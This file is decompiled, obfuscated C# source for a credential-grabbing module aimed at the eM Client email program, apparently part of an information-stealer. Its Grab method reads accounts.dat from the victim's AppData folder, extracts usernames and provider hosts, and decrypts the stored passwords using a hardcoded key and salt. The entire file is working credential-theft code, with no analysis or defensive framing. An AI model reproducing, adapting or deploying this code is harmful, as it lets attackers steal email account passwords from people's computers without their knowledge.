using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using _81d;
using p3N5Y;
using q9Ep;

namespace ZAZUx;

public class WTPMwoxx : MnVCfk
{
	[CompilerGenerated]
	private string Application__BackingField;

	public string n0GjWsvxR
	{
		[CompilerGenerated]
		get
		{
			return Application__BackingField;
		}
		[CompilerGenerated]
		set
		{
			Application__BackingField = value;
		}
	}

	public WTPMwoxx()
	{
		n0GjWsvxR = "eM Client";
	}

	public List<ii68> Grab()
	{
		int num = 0;
		string text = default;
		List<ii68> list = default;
		string text2 = default;
		while (true)
		{
			if (num == 2)
			{
				text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "eM Client\\accounts.dat");
				num = 3;
			}
			if (num == 5)
			{
				return list;
			}
			if (num != 6)
			{
				if (num == 1)
				{
					list = new List<ii68>();
					num = 2;
				}
				if (num == 4)
				{
					if (File.Exists(text))
					{
						goto IL_0070;
					}
					num = 5;
				}
				if (num == 3)
				{
					text2 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "eM Client");
					num = 4;
				}
				if (num == 0)
				{
					num = 1;
				}
				if (num == 7)
				{
					break;
				}
				continue;
			}
			goto IL_0070;
			IL_0070:
			try
			{
				_5bBC obj = new _5bBC(text);
				if (!obj.ga9("Accounts"))
				{
					return list;
				}
				for (int i = 0; i <= obj.FtN5geM() - 1; i++)
				{
					try
					{
						string text3 = obj.gzd4rqxbTqm(i, 0);
						string cHkPxUTF = obj.gzd4rqxbTqm(i, 1);
						if (Directory.Exists(text2 + "\\" + text3))
						{
							string username = b4v.jCFtRv(cHkPxUTF, "\"Username\":\"", "\",", 0);
							string str = b4v.jCFtRv(cHkPxUTF, "\"Secret\":\"", "\",", 0);
							str = Regex.Unescape(str);
							string password = zj9pwyn(str, "72905C47-F4FD-4CF7-A489-4E8121A155BD");
							string host = b4v.jCFtRv(cHkPxUTF, "\"ProviderName\":\"", "\",", 0);
							list.Add(new ii68
							{
								oVAe = n0GjWsvxR,
								S8v = username,
								_9H5rP7hg2 = password,
								byIdLuuGZbL = host
							});
						}
					}
					catch
					{
					}
				}
				return list;
			}
			catch
			{
				return list;
			}
		}
		List<ii68> result = default;
		return result;
	}

	private static string zj9pwyn(string PPv3, string _6BxTnEek)
	{
		int num = 0;
		RijndaelManaged rijndaelManaged = default;
		string result = default;
		do
		{
			if (num == 1)
			{
				rijndaelManaged = null;
				num = 2;
			}
			if (num == 2)
			{
				result = null;
				num = 3;
			}
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 3);
		try
		{
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(_6BxTnEek, Encoding.ASCII.GetBytes("o6806642kbM7c5"));
			using MemoryStream memoryStream = new MemoryStream(Convert.FromBase64String(PPv3));
			rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = uW4t(memoryStream);
			ICryptoTransform transform = rijndaelManaged.CreateDecryptor(rijndaelManaged.Key, rijndaelManaged.IV);
			using CryptoStream stream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Read);
			using StreamReader streamReader = new StreamReader(stream);
			result = streamReader.ReadToEnd();
		}
		catch
		{
		}
		finally
		{
			rijndaelManaged?.Clear();
		}
		return result;
	}

	private static byte[] uW4t(Stream N2RsU)
	{
		int num = 0;
		byte[] array = default;
		byte[] array2 = default;
		while (true)
		{
			if (num == 2)
			{
				if (N2RsU.Read(array, 0, array.Length) == array.Length)
				{
					goto IL_005c;
				}
				num = 3;
			}
			if (num != 4)
			{
				if (num == 1)
				{
					array = new byte[4];
					num = 2;
				}
				switch (num)
				{
				case 3:
					return null;
				case 0:
					num = 1;
					break;
				}
				if (num == 5)
				{
					break;
				}
				continue;
			}
			goto IL_005c;
			IL_005c:
			array2 = new byte[BitConverter.ToInt32(array, 0)];
			if (N2RsU.Read(array2, 0, array2.Length) == array2.Length)
			{
				break;
			}
			return null;
		}
		return array2;
	}
}
